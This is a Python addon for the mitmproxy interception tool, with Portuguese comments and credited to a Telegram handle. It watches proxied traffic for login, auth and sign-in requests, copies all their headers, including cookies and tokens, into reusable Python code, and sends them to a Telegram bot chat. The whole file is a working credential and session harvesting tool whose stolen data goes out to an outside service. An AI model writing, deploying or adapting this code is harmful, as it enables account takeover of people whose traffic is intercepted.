"""
MITMProxy Telegram Notifier - Addon de captura de headers
Criado por: @vgsswon
Grupo: https://t.me/+RriqgodAtpY4NTgx
"""
from mitmproxy import http, ctx
import telebot
import json
import threading
import os
import html
from typing import Dict, Any

TELEGRAM_BOT_TOKEN = os.environ.get("TG_BOT_TOKEN", "<SEU_BOT_TOKEN_AQUI>")
TELEGRAM_CHAT_ID = os.environ.get("TG_CHAT_ID", "<SEU_CHAT_ID_AQUI>")
MATCH_KEYWORDS = ["login", "/auth", "/signin"]
CHUNK_SIZE = 3800

bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN, threaded=True) if TELEGRAM_BOT_TOKEN and not TELEGRAM_BOT_TOKEN.startswith("<") else None

def _safe_chat_id(raw: str):
    try:
        return int(raw)
    except Exception:
        return raw

class HeaderCapture:
    def __init__(self) -> None:
        self.chat_id = _safe_chat_id(TELEGRAM_CHAT_ID)
        
    def load(self, loader):
        ctx.log.info("[HeaderCapture] Addon carregado")
        if not TELEGRAM_BOT_TOKEN or TELEGRAM_BOT_TOKEN.startswith("<"):
            ctx.log.warn("[HeaderCapture] TELEGRAM_BOT_TOKEN não definido; notificações desabilitadas")
        if not TELEGRAM_CHAT_ID or TELEGRAM_CHAT_ID.startswith("<"):
            ctx.log.warn("[HeaderCapture] TELEGRAM_CHAT_ID não definido; notificações desabilitadas")

    def _match_url(self, path: str) -> bool:
        p = (path or "").lower()
        return any(k.lower() in p for k in MATCH_KEYWORDS)

    def request(self, flow: http.HTTPFlow) -> None:
        req = flow.request
        method = (req.method or "").upper()
        if method not in ("GET", "POST"):
            return
        
        force_capture = req.headers.get("X-Intercept-Capture", "") == "true"
        
        if not force_capture and not self._match_url(req.path):
            return
        
        headers_dict = dict(req.headers)
        formatted_output = self._format_as_python_code(req.pretty_url, headers_dict)
        
        ctx.log.info(f"[HeaderCapture] matched flow {flow.id} -> notifying bot")
        if bot and self.chat_id:
            threading.Thread(target=self._send_to_telegram, args=(formatted_output,), daemon=True).start()
        else:
            ctx.log.info(f"[HeaderCapture] payload (no-bot):\n{formatted_output}")
    
    def _format_as_python_code(self, url: str, headers: Dict[str, str]) -> str:
        lines = [f"url = '{url}'", "headers = {"]
        
        for key, value in headers.items():
            safe_key = key.lower()
            safe_value = value.replace("'", "\\'")
            lines.append(f"    '{safe_key}': '{safe_value}',")
        
        lines.append("}")
        return "\n".join(lines)

    def _send_to_telegram(self, txt: str) -> None:
        if not bot:
            ctx.log.warn("[HeaderCapture] Bot not configured, skipping telegram send")
            return
            
        try:
            ctx.log.info(f"[HeaderCapture] Tentando enviar mensagem para chat_id={self.chat_id}")
            ctx.log.info(f"[HeaderCapture] Tamanho da mensagem: {len(txt)} caracteres")
            
            for i in range(0, len(txt), CHUNK_SIZE):
                chunk = txt[i:i + CHUNK_SIZE]
                safe = html.escape(chunk)
                msg = bot.send_message(self.chat_id, f"<pre>{safe}</pre>", parse_mode="HTML")
                ctx.log.info(f"[HeaderCapture] Mensagem enviada! Message ID: {msg.message_id}")
        except Exception as e:
            ctx.log.error(f"[HeaderCapture] ERRO ao enviar telegram: {type(e).__name__}: {e}")
            import traceback
            ctx.log.error(f"[HeaderCapture] Traceback: {traceback.format_exc()}")

addons = [HeaderCapture()]
